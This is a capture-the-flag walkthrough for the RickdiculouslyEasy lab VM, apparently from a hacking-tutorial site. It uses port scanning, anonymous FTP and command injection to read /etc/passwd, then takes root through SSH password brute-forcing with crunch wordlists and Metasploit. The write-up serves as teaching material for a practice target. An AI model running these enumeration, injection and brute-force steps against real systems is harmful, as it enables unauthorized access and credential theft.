@@ -1,0 +1,74 @@
+
+Hack the RickdiculouslyEasy VM (CTF Challenge)
+
+Hello friends! Today we are going to take another CTF challenge known as RickdiculouslyEasy. The credit for making this vm machine goes to “Luke” and it is another capture the flag challenge. Our goal is to capture flags and get 130 points in total to complete the challenge. You can download this VM here.
+Let’s Breach!!!
+The target holds 192.168.1.107 as network IP; now using nmap lets find out open ports.
+nmap -p- -A 192.168.1.107
+By doing the nmap scan, we find that port 21, 80, 9090, 13337, 22222, 60000 is open. Our nmap scan also shows us anonymous login is available on ftp.
+We enumerate the open ports further using netcat and found 2 flags.
+nc 192.168.1.107 13337
+nc 192.168.1.107 60000
+
+We opened port 9090 in web browser and find third flag.
+
+Now we use dirb to list the directories, as port 80 is open.
+dirb http://192.168.1.107/
+
+Using dirb we found a page http://192.168.1.107/passwords/. When we open it we find two files ‘flag.txt’ and ‘passwords.html’.
+
+When we open ‘FLAG.txt’ file and we our 4th flag.
+
+Now we open the passwords.html file. We can’t find anything on the page so we take a look at the source code of  the file, inside we find a password for some user.
+
+Nmap  scan showed that ftp is vulnerable to anonymous login. So we login ftp using username and password as anonymous.
+
+When we access ftp we get a file called FLAG.txt, we open it and find our 5th flag.
+
+We open robots.txt and find link to two files root_shell.cgi and tracertool.cgi
+
+http://192.168.1.107/cgi-bin/tracertoll.cgi is vulnerable to command injection.
+
+We find that few commands have been filtered we use ‘more‘ command to get the name of the users in /etc/passwd file.
+more /etc/passwd
+
+Now we login using ssh using username Summer and password winter that we found earlier.
+ssh -p 22222 Summer@192.168.1.107
+
+After connecting to ssh we find a file called FLAG.txt and inside the file we find our 6th flag.
+
+Now searching through the files we came across an image and zip file inside Morty/ directory. We download the files into our system through ssh.
+scp Safe_Password.jpg root@192.168.1.111:/root/Desktop
+scp journal.txt.zip root@192.168.1.111:/root/Desktop
+
+After download the files we use strings command to find if something is hidden inside the image file, and we find the password for unzipping journal.txt.zip file
+strings Safe_Passwords.jpg
+
+After unzipping the zip file, we open the file and find our 7th flag.
+
+Back at the target VM we find an executable file called ‘safe’ we try to run it but we don’t have permissions to run it. So we download the file to our system.
+scp safe root@192.168.1.111:/root/Desktop
+
+Now when we run the file it asks for argument. We use the string found inside the last flag(131333)and we get a hint for a password for user RickSanchez.
+
+As the password contains 1 uppercase character, 1 digit followed by one of the word in the name of the band of Rick Sanchez. We use crunch to create a dictionary. We find that the name of the band in which rick played was called ‘the flesh curtains’.
+crunch 10 10 -t ,%Curtains -o /root/Desktop/pass.txt
+crunch 7 7 -t ,%Flesh –o /root/Desktop/pass1.txt
+
+After creating the dictionary, we use dymerge tool to combine the both dictionary to form a single dictionary.
+python dymerge.py /root/Desktop/pass.txt /root/Desktop/pass1.txt -s -o /root/Desktop/password.txt
+
+Now that our dictionary is ready we bruteforce ssh using metasploit.
+msf > use auxiliary/scanner/ssh/ssh_login
+msf auxiliary(ssh_login) > set rhosts 192.168.1.107
+msf auxiliary(ssh_login) > set rport 22222
+msf auxiliary(ssh_login) > set pass_file /root/Desktop/password.txt
+msf auxiliary(ssh_login) > set username RickSanchez
+msf auxiliary(ssh_login) > run
+
+After successfully brute-forcing ssh, we spawn terminal using python.
+After spawning the terminal, we take a look at the sudoers list. We find that we have all the privileges of root.
+
+We switch to root user then move to root folder. Inside the root folder we find a file called FLAG.txt, when we open the file we find our final flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
